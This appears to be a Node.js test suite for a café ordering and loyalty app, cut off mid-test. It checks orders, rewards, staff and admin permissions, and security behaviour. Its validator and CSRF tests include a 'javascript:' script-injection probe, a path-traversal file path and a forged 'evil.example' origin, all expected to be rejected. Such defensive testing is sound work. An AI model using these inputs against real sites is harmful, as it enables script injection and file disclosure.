import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { openDb } from '../server/db.js';
import { createApp } from '../server/app.js';
import { validatePickup } from '../server/rules.js';

// Staff/admin passwords come from the environment now; tests pin known values.
process.env.ADMIN_PASSWORD = 'admin123';
process.env.STAFF_PASSWORD = 'staff123';
// Many tests order for the same pickup slot; the capacity test lowers this on purpose.
process.env.SLOT_CAPACITY = '1000';

let server, base, db;
before(async () => {
  db = openDb(':memory:');
  server = createApp(db).listen(0);
  await new Promise((r) => server.once('listening', r));
  base = `http://localhost:${server.address().port}`;
});
after(() => server.close());

// Minimal client that keeps the session cookie.
function client() {
  let cookie = '';
  const call = async (method, path, body) => {
    const res = await fetch(base + path, {
      method,
      headers: { 'content-type': 'application/json', cookie },
      body: body && JSON.stringify(body),
    });
    const set = res.headers.get('set-cookie');
    if (set) cookie = set.split(';')[0];
    return { status: res.status, body: await res.json().catch(() => null) };
  };
  Object.defineProperty(call, 'cookie', { get: () => cookie });
  return call;
}

// Raw session cookie of a test client (for requests that need the full response, e.g. CSV).
const cookieOf = async (c) => c.cookie;

async function login(id, password) {
  const c = client();
  assert.equal((await c('POST', '/api/login', { id, password })).status, 200);
  return c;
}

// Next pickup slot that passes validation (an hour step search from tomorrow).
function nextOpen() {
  const t = new Date(Date.now() + 864e5);
  t.setUTCMinutes(0, 0, 0);
  while (validatePickup(t)) t.setTime(t.getTime() + 3600e3);
  return t.toISOString();
}
// Tomorrow 21:30 Berlin (19:30 UTC in summer, 20:30 in winter): always after closing.
function afterClosing() {
  const t = new Date(Date.now() + 864e5);
  t.setUTCHours(19, 30, 0, 0);
  return t.toISOString();
}

const itemByName = (name) => db.prepare('SELECT * FROM menu_items WHERE name = ?').get(name);

test('register returns a member ID and logs in', async () => {
  const c = client();
  const r = await c('POST', '/api/register', { name: 'Test', email: 't@example.com', password: 'secret12' });
  assert.equal(r.status, 201);
  assert.match(r.body.member_id, /^SASU-\d{4,}$/);
  assert.equal((await c('GET', '/api/me')).body.email, 't@example.com');
});

test('register rejects duplicate email and short password', async () => {
  const c = client();
  assert.equal((await c('POST', '/api/register', { name: 'A', email: 'anna@example.com', password: 'secret12' })).status, 409);
  assert.equal((await c('POST', '/api/register', { name: 'A', email: 'x@example.com', password: '123' })).status, 400);
});

test('login works with member ID or email, rejects wrong password', async () => {
  await login('SASU-1003', 'demo123');
  await login('ANNA@example.com', 'demo123');
  assert.equal((await client()('POST', '/api/login', { id: 'SASU-1003', password: 'nope' })).status, 401);
  assert.equal((await client()('POST', '/api/login', { id: 'SASU-9999', password: 'nope' })).status, 401);
});

test('me includes tier info', async () => {
  const c = await login('SASU-1005', 'demo123');
  const me = (await c('GET', '/api/me')).body;
  assert.equal(me.tier.name, 'Gold');
  assert.equal(me.password_hash, undefined);
});

test('order total uses DB prices, ignores client prices', async () => {
  const c = await login('SASU-1003', 'demo123'); // Bronze, no discount
  const cap = itemByName('Cappuccino');
  const r = await c('POST', '/api/orders', { items: [{ id: cap.id, qty: 2, price_cents: 1 }], pickup_at: nextOpen() });
  assert.equal(r.status, 201);
  assert.equal(r.body.total_cents, cap.price_cents * 2);
});

test('order gets tier discount', async () => {
  const c = await login('SASU-1004', 'demo123'); // Silver 5%
  const r = await c('POST', '/api/orders', { items: [{ id: itemByName('Cheesecake').id, qty: 1 }], pickup_at: nextOpen() });
  assert.equal(r.body.total_cents, 799 - Math.floor(799 * 0.05));
});

test('order rejects pickup after closing and anonymous users', async () => {
  const c = await login('SASU-1003', 'demo123');
  const items = [{ id: itemByName('Cappuccino').id, qty: 1 }];
  assert.equal((await c('POST', '/api/orders', { items, pickup_at: afterClosing() })).status, 400);
  assert.equal((await client()('POST', '/api/orders', { items, pickup_at: nextOpen() })).status, 401);
});

test('order rejects bad items and quantities', async () => {
  const c = await login('SASU-1003', 'demo123');
  const pickup_at = nextOpen();
  const id = itemByName('Croissant').id;
  for (const items of [[], [{ id, qty: 0 }], [{ id, qty: -1 }], [{ id, qty: 1.5 }], [{ id: 99999, qty: 1 }], 'x']) {
    assert.equal((await c('POST', '/api/orders', { items, pickup_at })).status, 400, JSON.stringify(items));
  }
  db.prepare('UPDATE menu_items SET active = 0 WHERE id = ?').run(id);
  assert.equal((await c('POST', '/api/orders', { items: [{ id, qty: 1 }], pickup_at })).status, 400);
  db.prepare('UPDATE menu_items SET active = 1 WHERE id = ?').run(id);
});

test('reward with too few points is rejected', async () => {
  const c = await login('SASU-1003', 'demo123'); // 80 points
  const cake = db.prepare("SELECT id FROM rewards WHERE category_allowed = 'cake'").get();
  const r = await c('POST', '/api/orders', { items: [{ id: itemByName('Cheesecake').id, qty: 1 }], pickup_at: nextOpen(), reward_id: cake.id });
  assert.equal(r.status, 400);
});

test('reward makes item free, cancel refunds points', async () => {
  const c = await login('SASU-1003', 'demo123');
  const pastry = db.prepare("SELECT id FROM rewards WHERE category_allowed = 'pastry'").get();
  const before = (await c('GET', '/api/me')).body.points;
  const r = await c('POST', '/api/orders', {
    items: [{ id: itemByName('Croissant').id, qty: 1 }, { id: itemByName('Espresso').id, qty: 1 }],
    pickup_at: nextOpen(), reward_id: pastry.id,
  });
  assert.equal(r.status, 201);
  assert.equal(r.body.total_cents, 249);
  assert.equal((await c('GET', '/api/me')).body.points, before - 50);
  assert.equal((await c('POST', `/api/orders/${r.body.id}/cancel`)).status, 200);
  assert.equal((await c('GET', '/api/me')).body.points, before);
});

test('cannot cancel someone else\'s order or a started one', async () => {
  const anna = await login('SASU-1003', 'demo123');
  const mehmet = await login('SASU-1004', 'demo123');
  const r = await anna('POST', '/api/orders', { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: nextOpen() });
  assert.equal((await mehmet('POST', `/api/orders/${r.body.id}/cancel`)).status, 404);
  db.prepare("UPDATE orders SET status = 'preparing' WHERE id = ?").run(r.body.id);
  assert.equal((await anna('POST', `/api/orders/${r.body.id}/cancel`)).status, 409);
});

test('orders list shows only own orders with items', async () => {
  const c = await login('SASU-1003', 'demo123');
  const list = (await c('GET', '/api/orders')).body;
  assert.ok(list.length > 0);
  assert.ok(list.every((o) => o.user_id === 4));
  assert.ok(list[0].items[0].name);
});

test('menu is public and hides inactive items', async () => {
  const r = await client()('GET', '/api/menu');
  assert.equal(r.status, 200);
  assert.ok(r.body.length >= 49);
  assert.ok(r.body.every((i) => i.active === 1));
});

test('customer is blocked from admin API', async () => {
  const c = await login('SASU-1003', 'demo123');
  assert.equal((await c('GET', '/api/admin/orders')).status, 403);
  assert.equal((await client()('GET', '/api/admin/orders')).status, 401);
});

test('logout ends the session', async () => {
  const c = await login('SASU-1003', 'demo123');
  await c('POST', '/api/logout');
  const r = await c('GET', '/api/me');
  assert.equal(r.status, 200);
  assert.equal(r.body, null);
});

// --- staff / admin ---------------------------------------------------------

async function newOrder(c) {
  return (await c('POST', '/api/orders', { items: [{ id: itemByName('Cheesecake').id, qty: 2 }], pickup_at: nextOpen() })).body;
}

test('staff moves order to picked_up, points credited once', async () => {
  const anna = await login('SASU-1003', 'demo123');
  const lena = await login('SASU-1001', 'staff123');
  const o = await newOrder(anna);
  const before = (await anna('GET', '/api/me')).body;
  assert.ok((await lena('GET', '/api/admin/orders')).body.some((x) => x.id === o.id));
  for (const status of ['preparing', 'ready', 'picked_up']) {
    assert.equal((await lena('PATCH', `/api/admin/orders/${o.id}`, { status })).status, 200);
  }
  assert.equal((await lena('PATCH', `/api/admin/orders/${o.id}`, { status: 'picked_up' })).status, 409);
  const after = (await anna('GET', '/api/me')).body;
  assert.equal(after.points - before.points, Math.floor(o.total_cents / 100));
  assert.equal(after.lifetime_points - before.lifetime_points, Math.floor(o.total_cents / 100));
  assert.equal((await lena('PATCH', `/api/admin/orders/${o.id}`, { status: 'bogus' })).status, 400);
});

test('staff cannot see finance or edit menu', async () => {
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/admin/finance?range=month')).status, 403);
  assert.equal((await lena('PATCH', '/api/admin/menu/1', { price_cents: 1 })).status, 403);
});

test('clock toggles one shift at a time', async () => {
  const yusuf = await login('SASU-1002', 'staff123');
  const before = db.prepare('SELECT COUNT(*) n FROM shifts WHERE user_id = 3').get().n;
  assert.equal((await yusuf('POST', '/api/admin/shifts/clock')).body.open, true);
  assert.equal((await yusuf('POST', '/api/admin/shifts/clock')).body.open, false);
  assert.equal(db.prepare('SELECT COUNT(*) n FROM shifts WHERE user_id = 3').get().n, before + 1);
  assert.equal(db.prepare('SELECT COUNT(*) n FROM shifts WHERE clock_out IS NULL AND user_id = 3').get().n, 0);
  const mine = (await yusuf('GET', '/api/admin/shifts')).body;
  assert.equal(mine.length, 1);
  assert.equal(mine[0].member_id, 'SASU-1002');
});

test('admin sees all staff hours and finance', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const shifts = (await admin('GET', '/api/admin/shifts')).body;
  assert.ok(shifts.length >= 2);
  assert.ok(shifts.find((s) => s.member_id === 'SASU-1001').hours_month > 0);

  const f = (await admin('GET', '/api/admin/finance?range=month')).body;
  const since = new Date(Date.now() - 30 * 864e5).toISOString();
  const expected = db.prepare("SELECT SUM(total_cents) s FROM orders WHERE status = 'picked_up' AND pickup_at >= ?").get(since).s;
  assert.equal(f.revenue, expected);
  assert.ok(f.wages > 0);
  assert.equal(f.profit, f.revenue - f.wages);
  assert.ok(f.top.length > 0 && f.top.length <= 5);
  assert.equal((await admin('GET', '/api/admin/finance?range=year')).status, 400);
});

test('admin edits and adds menu items', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const id = itemByName('Espresso').id;
  assert.equal((await admin('PATCH', `/api/admin/menu/${id}`, { price_cents: 279 })).status, 200);
  assert.equal(itemByName('Espresso').price_cents, 279);
  assert.equal((await admin('PATCH', `/api/admin/menu/${id}`, { price_cents: -5 })).status, 400);
  const r = await admin('POST', '/api/admin/menu', { name: 'Ristretto', category: 'coffee', price_cents: 259 });
  assert.equal(r.status, 201);
  assert.ok((await admin('GET', '/api/admin/menu')).body.some((m) => m.name === 'Ristretto'));
});

test('pickup slots are all valid and 15 minutes apart', async () => {
  const slots = (await client()('GET', '/api/pickup-slots')).body;
  assert.ok(slots.length > 0 && slots.length <= 60);
  for (const s of slots) assert.equal(validatePickup(new Date(s)), null, s);
  assert.equal(new Date(slots[0]).getUTCMinutes() % 15, 0);
});

test('walk-in account cannot log in', async () => {
  assert.equal((await client()('POST', '/api/login', { id: 'gast@cafe-elsasu.de', password: 'x' })).status, 401);
});

test('birthday coffee can be redeemed once per year', async () => {
  const today = new Intl.DateTimeFormat('en-CA', { timeZone: 'Europe/Berlin' }).format(new Date());
  db.prepare("UPDATE users SET birthday = ? WHERE member_id = 'SASU-1005'").run('1995' + today.slice(4));
  const c = await login('SASU-1005', 'demo123'); // Gold
  const bday = db.prepare('SELECT id FROM rewards WHERE birthday_only = 1').get();
  assert.ok((await c('GET', '/api/rewards')).body.some((r) => r.id === bday.id));
  const body = { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: nextOpen(), reward_id: bday.id };
  const first = await c('POST', '/api/orders', body);
  assert.equal(first.status, 201);
  assert.equal(first.body.total_cents, 0);
  assert.equal((await c('POST', '/api/orders', body)).status, 400);
  assert.ok(!(await c('GET', '/api/rewards')).body.some((r) => r.id === bday.id));
  await c('POST', `/api/orders/${first.body.id}/cancel`);
  assert.ok((await c('GET', '/api/rewards')).body.some((r) => r.id === bday.id), 'cancel gives it back');
});

// --- account ----------------------------------------------------------------

test('me includes friendly stats: saved money, free treats, favorite — never total spent', async () => {
  const c = await login('SASU-1004', 'demo123');
  const me = (await c('GET', '/api/me')).body;
  const row = db.prepare(`SELECT COALESCE(SUM(discount_cents), 0) saved, COUNT(reward_id) treats
    FROM orders WHERE user_id = 5 AND status = 'picked_up'`).get();
  assert.equal(me.stats.saved_cents, row.saved);
  assert.equal(me.stats.rewards_redeemed, row.treats);
  assert.ok(me.stats.favorite);
  assert.equal(me.stats.spent_cents, undefined);
});

test('profile update changes name, email, birthday', async () => {
  const c = client();
  await c('POST', '/api/register', { name: 'Old', email: 'old@example.com', password: 'secret12' });
  const r = await c('PATCH', '/api/me', { name: 'Neu Name', email: 'neu@example.com', birthday: '1990-05-17' });
  assert.equal(r.status, 200);
  assert.equal(r.body.name, 'Neu Name');
  assert.equal(r.body.email, 'neu@example.com');
  assert.equal(r.body.birthday, '1990-05-17');
  assert.equal((await c('PATCH', '/api/me', { email: 'anna@example.com' })).status, 409);
  assert.equal((await c('PATCH', '/api/me', { email: 'nope' })).status, 400);
  assert.equal((await c('PATCH', '/api/me', { birthday: '2000-13-45' })).status, 400);
  assert.equal((await c('PATCH', '/api/me', { role: 'admin', points: 9999 })).status, 400);
  assert.equal((await c('GET', '/api/me')).body.role, 'customer');
  assert.equal((await c('PATCH', '/api/me', { birthday: null })).body.birthday, null);
});

test('password change needs the current password', async () => {
  const c = client();
  await c('POST', '/api/register', { name: 'Pw', email: 'pw@example.com', password: 'secret12' });
  assert.equal((await c('POST', '/api/me/password', { current: 'wrong', next: 'newsecret' })).status, 401);
  assert.equal((await c('POST', '/api/me/password', { current: 'secret12', next: '123' })).status, 400);
  assert.equal((await c('POST', '/api/me/password', { current: 'secret12', next: 'newsecret' })).status, 200);
  assert.equal((await client()('POST', '/api/login', { id: 'pw@example.com', password: 'secret12' })).status, 401);
  await login('pw@example.com', 'newsecret');
});

test('account routes need login', async () => {
  assert.equal((await client()('PATCH', '/api/me', { name: 'x' })).status, 401);
  assert.equal((await client()('POST', '/api/me/password', { current: 'a', next: 'bbbbbb' })).status, 401);
});

// --- home page ---------------------------------------------------------------

test('status reports open/closed with next change and next pickup', async () => {
  const s = (await client()('GET', '/api/status')).body;
  assert.equal(typeof s.open, 'boolean');
  assert.ok(!isNaN(new Date(s.changes_at)));
  assert.ok(new Date(s.changes_at) > new Date());
  assert.equal(validatePickup(new Date(s.next_pickup)), null);
});

test('popular returns up to 4 active items, best sellers first', async () => {
  const list = (await client()('GET', '/api/popular')).body;
  assert.equal(list.length, 4);
  assert.ok(list.every((i) => i.active === 1 && i.sold >= 0));
  assert.ok(list[0].sold >= list[3].sold);
});

// --- single-page app -----------------------------------------------------------

test('login returns role for each account type', async () => {
  for (const [id, pw, role] of [['SASU-1003', 'demo123', 'customer'], ['SASU-1001', 'staff123', 'staff'], ['SASU-1000', 'admin123', 'admin']]) {
    const r = await client()('POST', '/api/login', { id, password: pw });
    assert.equal(r.body.role, role, id);
  }
});

test('old page URLs redirect to hash routes', async () => {
  const map = {
    '/menu.html': '/#/speisekarte', '/order.html': '/#/warenkorb', '/login.html': '/#/login',
    '/account.html': '/#/konto', '/admin.html': '/#/admin', '/credits.html': '/#/bildnachweise', '/about.html': '/#/',
  };
  for (const [old, target] of Object.entries(map)) {
    const res = await fetch(base + old, { redirect: 'manual' });
    assert.equal(res.status, 301, old);
    assert.equal(res.headers.get('location'), target, old);
  }
});

// --- security --------------------------------------------------------------------

test('responses carry security headers and hide Express', async () => {
  const res = await fetch(base + '/');
  const csp = res.headers.get('content-security-policy');
  assert.match(csp, /script-src 'self'(;|$)/);
  assert.match(csp, /frame-ancestors 'none'/);
  assert.equal(res.headers.get('x-frame-options'), 'DENY');
  assert.equal(res.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(res.headers.get('referrer-policy'), 'strict-origin-when-cross-origin');
  assert.equal(res.headers.get('x-powered-by'), null);
});

test('write requests must be JSON from our own origin', async () => {
  const post = (headers, body) => fetch(base + '/api/login', { method: 'POST', headers, body });
  assert.equal((await post({ 'content-type': 'text/plain' }, 'id=SASU-1003&password=demo123')).status, 403);
  assert.equal((await post({ 'content-type': 'application/x-www-form-urlencoded' }, 'id=x')).status, 403);
  assert.equal((await post({ 'content-type': 'application/json', origin: 'https://evil.example' }, '{"id":"SASU-1003","password":"demo123"}')).status, 403);
  assert.equal((await post({ 'content-type': 'application/json', origin: base }, '{"id":"SASU-1003","password":"demo123"}')).status, 200);
});

test('login is blocked after 5 wrong passwords for an account', async () => {
  const c = client();
  await c('POST', '/api/register', { name: 'Brute', email: 'brute@example.com', password: 'richtig123' });
  for (let i = 0; i < 5; i++) assert.equal((await client()('POST', '/api/login', { id: 'brute@example.com', password: 'falsch' + i })).status, 401);
  const blocked = await client()('POST', '/api/login', { id: 'brute@example.com', password: 'richtig123' });
  assert.equal(blocked.status, 429);
  assert.match(blocked.body.error, /15 Minuten/);
});

test('new passwords need at least 8 characters', async () => {
  assert.equal((await client()('POST', '/api/register', { name: 'Kurz', email: 'kurz@example.com', password: '1234567' })).status, 400);
  assert.equal((await client()('POST', '/api/register', { name: 'Lang', email: 'lang@example.com', password: '12345678' })).status, 201);
});

test('staff and admin cannot order, redeem or use customer pages', async () => {
  for (const [id, pw] of [['SASU-1001', 'staff123'], ['SASU-1000', 'admin123']]) {
    const c = await login(id, pw);
    assert.equal((await c('POST', '/api/orders', { items: [{ id: itemByName('Espresso').id, qty: 1 }], pickup_at: nextOpen() })).status, 403, id);
    assert.equal((await c('GET', '/api/orders')).status, 403, id);
    assert.equal((await c('GET', '/api/rewards')).status, 403, id);
    assert.equal((await c('GET', '/api/me/qr')).status, 403, id);
  }
});

test('customer gets a QR code of their member ID', async () => {
  const c = await login('SASU-1003', 'demo123');
  assert.equal((await fetch(base + '/api/me/qr')).status, 401); // no session cookie
  const r = await c('GET', '/api/me/qr');
  assert.equal(r.status, 200);
});

// --- modifiers ---------------------------------------------------------------------

const optionId = (item, name) => item.modifiers.flatMap((g) => g.options).find((o) => o.name === name).id;
const menuItem = async (name) => (await client()('GET', '/api/menu')).body.find((i) => i.name === name);

test('menu lists modifier groups per item', async () => {
  const flat = await menuItem('Flat White');
  assert.deepEqual(flat.modifiers.map((g) => g.name), ['Milch', 'Sirup', 'Extra Shot']);
  assert.ok(flat.modifiers[0].options.some((o) => o.name === 'Hafermilch' && o.price_cents === 50));
  assert.deepEqual((await menuItem('Cold Brew')).modifiers.map((g) => g.name), ['Extra Shot', 'Eis']);
  assert.deepEqual((await menuItem('Cheesecake')).modifiers, []);
});

test('order with modifiers stores options and charges them', async () => {
  const c = await login('SASU-1003', 'demo123'); // Bronze: no discount
  const flat = await menuItem('Flat White');
  const r = await c('POST', '/api/orders', {
    items: [{ id: flat.id, qty: 2, mods: [optionId(flat, 'Hafermilch'), optionId(flat, 'Extra Shot')] }],
    pickup_at: nextOpen(),
  });
  assert.equal(r.status, 201);
  assert.equal(r.body.total_cents, (flat.price_cents + 50 + 80) * 2);
  assert.deepEqual(r.body.items[0].modifiers.map((m) => m.name), ['Hafermilch', 'Extra Shot']);
  const listed = (await c('GET', '/api/orders')).body.find((o) => o.id === r.body.id);
  assert.deepEqual(listed.items[0].modifiers.map((m) => m.name), ['Hafermilch', 'Extra Shot']);
});

test('required milk defaults to Vollmilch', async () => {
  const c = await login('SASU-1003', 'demo123');
  const flat = await menuItem('Flat White');
  const r = await c('POST', '/api/orders', { items: [{ id: flat.id, qty: 1 }], pickup_at: nextOpen() });
  assert.deepEqual(r.body.items[0].modifiers.map((m) => m.name), ['Vollmilch']);
  assert.equal(r.body.total_cents, flat.price_cents);
});

test('invalid modifiers are rejected', async () => {
  const c = await login('SASU-1003', 'demo123');
  const flat = await menuItem('Flat White');
  const brew = await menuItem('Cold Brew');
  const pickup_at = nextOpen();
  for (const mods of [[optionId(brew, 'Viel Eis')], [optionId(flat, 'Hafermilch'), optionId(flat, 'Mandelmilch')], 'x', [1.5]]) {
    assert.equal((await c('POST', '/api/orders', { items: [{ id: flat.id, qty: 1, mods }], pickup_at })).status, 400, JSON.stringify(mods));
  }
});

test('free coffee reward still charges the oat milk', async () => {
  const c = await login('SASU-1005', 'demo123'); // Gold, 10 %
  const flat = await menuItem('Flat White');
  const coffee = db.prepare("SELECT id FROM rewards WHERE category_allowed = 'coffee' AND birthday_only = 0").get();
  db.prepare("UPDATE users SET points = 500 WHERE member_id = 'SASU-1005'").run();
  const r = await c('POST', '/api/orders', { items: [{ id: flat.id, qty: 1, mods: [optionId(flat, 'Hafermilch')] }], pickup_at: nextOpen(), reward_id: coffee.id });
  assert.equal(r.status, 201);
  assert.equal(r.body.total_cents, 50 - Math.floor(50 * 0.10));
});

// --- pickup capacity -----------------------------------------------------------------

// A pickup window far from the others (3rd open slot after tomorrow) so earlier tests don't fill it.
function quietSlot() {
  const t = new Date(nextOpen());
  t.setTime(t.getTime() + 2 * 3600e3);
  while (validatePickup(t)) t.setTime(t.getTime() + 900e3);
  return t.toISOString();
}

test('a pickup window takes only slot_capacity orders', async () => {
  db.prepare("UPDATE settings SET value = '2' WHERE key = 'slot_capacity'").run();
  try {
    const c = await login('SASU-1003', 'demo123');
    const at = quietSlot();
    const order = () => c('POST', '/api/orders', { items: [{ id: itemByName('Croissant').id, qty: 6 }], pickup_at: at });
    assert.equal((await order()).status, 201);
    const second = await order();
    assert.equal(second.status, 201);
    const third = await order();
    assert.equal(third.status, 409);
    assert.match(third.body.error, /ausgebucht/);
    // cancelling frees the place again
    await c('POST', `/api/orders/${second.body.id}/cancel`);
    assert.equal((await order()).status, 201);
  } finally {
    db.prepare("UPDATE settings SET value = '1000' WHERE key = 'slot_capacity'").run();
  }
});

test('availability marks full windows', async () => {
  db.prepare("UPDATE settings SET value = '1' WHERE key = 'slot_capacity'").run();
  try {
    const list = (await client()('GET', '/api/pickup-availability')).body;
    assert.ok(list.length > 0);
    for (const s of list) assert.equal(validatePickup(new Date(s.at)), null);
    const taken = db.prepare("SELECT pickup_at FROM orders WHERE status IN ('new','preparing','ready') ORDER BY pickup_at LIMIT 1").get();
    const slot = list.find((s) => s.at === taken.pickup_at);
    assert.ok(slot, 'an existing order sits in a listed slot');
    assert.equal(slot.full, true);
    assert.equal(slot.left, 0);
    assert.ok(list.some((s) => !s.full && s.left === 1));
  } finally {
    db.prepare("UPDATE settings SET value = '1000' WHERE key = 'slot_capacity'").run();
  }
});

// --- menu & inventory --------------------------------------------------------------

test('staff can mark an item sold out; guests can no longer order it', async () => {
  const lena = await login('SASU-1001', 'staff123');
  const anna = await login('SASU-1003', 'demo123');
  const id = itemByName('Baklava').id;
  assert.equal((await anna('PATCH', `/api/admin/menu/${id}/sold-out`, { sold_out: 1 })).status, 403);
  assert.equal((await lena('PATCH', `/api/admin/menu/${id}/sold-out`, { sold_out: 'ja' })).status, 400);
  const r = await lena('PATCH', `/api/admin/menu/${id}/sold-out`, { sold_out: 1 });
  assert.equal(r.status, 200);
  assert.equal(r.body.sold_out, 1);
  assert.equal((await menuItem('Baklava')).sold_out, 1); // still listed on the Speisekarte
  const order = await anna('POST', '/api/orders', { items: [{ id, qty: 1 }], pickup_at: nextOpen() });
  assert.equal(order.status, 400);
  assert.match(order.body.error, /ausverkauft/);
  await lena('PATCH', `/api/admin/menu/${id}/sold-out`, { sold_out: 0 });
  assert.equal((await anna('POST', '/api/orders', { items: [{ id, qty: 1 }], pickup_at: nextOpen() })).status, 201);
});

test('staff can read the full menu list but not edit it', async () => {
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/admin/menu')).status, 200);
  assert.equal((await lena('PATCH', `/api/admin/menu/${itemByName('Espresso').id}`, { description: 'x' })).status, 403);
});

test('admin edits description, category, tags and photo', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const id = itemByName('Zimtschnecke').id;
  const ok = await admin('PATCH', `/api/admin/menu/${id}`, {
    description: 'Mit Kardamom', category: 'cake', tags: 'gluten,lactose', photo: 'photos/menu/cinnamonroll.jpg',
  });
  assert.equal(ok.status, 200);
  assert.equal(ok.body.description, 'Mit Kardamom');
  assert.equal(ok.body.category, 'cake');
  assert.equal((await admin('PATCH', `/api/admin/menu/${id}`, { photo: 'https://images.example.com/zimt.jpg' })).status, 200);
  for (const bad of [{ tags: 'vegan,scharf' }, { category: 'tea' }, { photo: 'http://insecure.example/x.jpg' }, { photo: 'photos/../server/app.js' }, { photo: 'javascript:alert(1)' }]) {
    assert.equal((await admin('PATCH', `/api/admin/menu/${id}`, bad)).status, 400, JSON.stringify(bad));
  }
});

test('deleting: never-ordered items go, ordered items are hidden', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  const fresh = (await admin('POST', '/api/admin/menu', { name: 'Testkuchen', category: 'cake', price_cents: 300 })).body;
  assert.equal((await lena('DELETE', `/api/admin/menu/${fresh.id}`)).status, 403);
  const gone = await admin('DELETE', `/api/admin/menu/${fresh.id}`);
  assert.deepEqual(gone.body, { deleted: true });
  assert.equal(db.prepare('SELECT 1 FROM menu_items WHERE id = ?').get(fresh.id), undefined);
  const ordered = itemByName('Cappuccino').id;
  const hidden = await admin('DELETE', `/api/admin/menu/${ordered}`);
  assert.deepEqual(hidden.body, { deleted: false, hidden: true });
  assert.equal(itemByName('Cappuccino').active, 0);
  db.prepare('UPDATE menu_items SET active = 1 WHERE id = ?').run(ordered);
  assert.equal((await admin('DELETE', '/api/admin/menu/999999')).status, 404);
});

test('photos may come from https sites', async () => {
  const csp = (await fetch(base + '/')).headers.get('content-security-policy');
  assert.match(csp, /img-src 'self' data: https:/);
});

// --- staff management --------------------------------------------------------------

test('admin creates a staff account with a temporary password', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  const body = { name: 'Mia Krüger', email: 'mia@cafe-elsasu.de', password: 'Willkommen1', hourly_wage: 1450 };
  assert.equal((await lena('POST', '/api/admin/staff', body)).status, 403);
  for (const bad of [{ ...body, password: 'kurz' }, { ...body, hourly_wage: -1 }, { ...body, hourly_wage: 12.5 }, { ...body, email: 'x' }]) {
    assert.equal((await admin('POST', '/api/admin/staff', bad)).status, 400, JSON.stringify(bad));
  }
  const r = await admin('POST', '/api/admin/staff', body);
  assert.equal(r.status, 201);
  assert.match(r.body.member_id, /^SASU-\d+$/);
  assert.equal(r.body.role, 'staff');
  assert.equal(r.body.password_hash, undefined);
  assert.equal((await admin('POST', '/api/admin/staff', body)).status, 409);
  assert.ok((await admin('GET', '/api/admin/staff')).body.some((u) => u.email === 'mia@cafe-elsasu.de' && u.hourly_wage === 1450));
});

test('a temporary password must be changed at first login', async () => {
  const mia = await login('mia@cafe-elsasu.de', 'Willkommen1');
  assert.equal((await mia('GET', '/api/me')).body.must_change_password, 1);
  assert.equal((await mia('POST', '/api/me/password', { current: 'Willkommen1', next: 'MeinEigenes99' })).status, 200);
  assert.equal((await mia('GET', '/api/me')).body.must_change_password, 0);
});

test('admin changes wages and deactivates staff', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const mia = await login('mia@cafe-elsasu.de', 'MeinEigenes99');
  const id = db.prepare("SELECT id FROM users WHERE email = 'mia@cafe-elsasu.de'").get().id;
  await mia('POST', '/api/admin/shifts/clock'); // on shift
  assert.equal((await admin('PATCH', `/api/admin/staff/${id}`, { hourly_wage: 1650 })).body.hourly_wage, 1650);
  const off = await admin('PATCH', `/api/admin/staff/${id}`, { active: 0 });
  assert.equal(off.body.active, 0);
  assert.equal((await mia('GET', '/api/me')).body, null, 'sessions ended');
  assert.ok(db.prepare('SELECT clock_out FROM shifts WHERE user_id = ? ORDER BY id DESC').get(id).clock_out, 'open shift closed');
  const blocked = await client()('POST', '/api/login', { id: 'mia@cafe-elsasu.de', password: 'MeinEigenes99' });
  assert.equal(blocked.status, 403);
  assert.match(blocked.body.error, /deaktiviert/);
  await admin('PATCH', `/api/admin/staff/${id}`, { active: 1 });
  await login('mia@cafe-elsasu.de', 'MeinEigenes99');
});

test('staff edits are limited to staff accounts, never yourself', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const self = db.prepare("SELECT id FROM users WHERE member_id = 'SASU-1000'").get().id;
  const guest = db.prepare("SELECT id FROM users WHERE member_id = 'SASU-1003'").get().id;
  assert.equal((await admin('PATCH', `/api/admin/staff/${self}`, { active: 0 })).status, 400);
  assert.equal((await admin('PATCH', `/api/admin/staff/${guest}`, { hourly_wage: 1 })).status, 404);
  assert.equal((await admin('PATCH', `/api/admin/staff/${guest}`, { role: 'admin' })).status, 400);
});

test('shift list shows hours and cost per shift and per person', async () => {
  const admin = await login('SASU-1000', 'admin123');
  const lena = await login('SASU-1001', 'staff123');
  assert.equal((await lena('GET', '/api/admin/shifts/list?range=week')).status, 403);
  assert.equal((await admin('GET', '/api/admin/shifts/list?range=year')).status, 400);
  const r = (await admin('GET', '/api/admin/shifts/list?range=month')).body;
  const done = r.shifts.find((s) => s.clock_out && s.name === 'Lena Becker');
  assert.ok(done);
  assert.equal(done.hours, 8);
  assert.equal(done.cost_cents, 8 * 1400);
  const lenaTotal = r.totals.find((t) => t.name === 'Lena Becker');
  const sum = r.shifts.filter((s) => s.name === 'Lena Becker').reduce((a, s) => a + s.cost_cents, 0);
  assert.equal(lenaTotal.cost_cents, sum);
});

// --- kitchen display: rush controls & member lookup ---------------------------------

test('staff read and switch rush settings; capacity is admin-only', async () => {
  const lena = await login('SASU-1001', 'staff123');
  const admin = await login('SASU-1000', 'admin123');
  const anna = await login('SASU-1003', 'demo123');
  assert.equal((await anna('GET', '/api/admin/settings')).status, 403);
  const s = (await lena('GET', '/api/admin/settings')).body;
  assert.equal(s.orders_paused, 0);
  assert.equal(s.extra_delay_min, 0);
  assert.equal((await lena('PATCH', '/api/admin/settings', { extra_delay_min: 20 })).status, 400);
  assert.equal((await lena('PATCH', '/api/admin/settings', { slot_capacity: 3 })).status, 403);
  assert.equal((await admin('PATCH', '/api/admin/settings', { slot_capacity: 0 })).status, 400);
  assert.equal((await admin('PATCH', '/api/admin/settings', { slot_capacity: 1000 })).body.slot_capacity, 1000);
});

test('pausing online orders stops new orders and shows on the status', async () => {
  const lena = await login('SASU-1001', 'staff123');
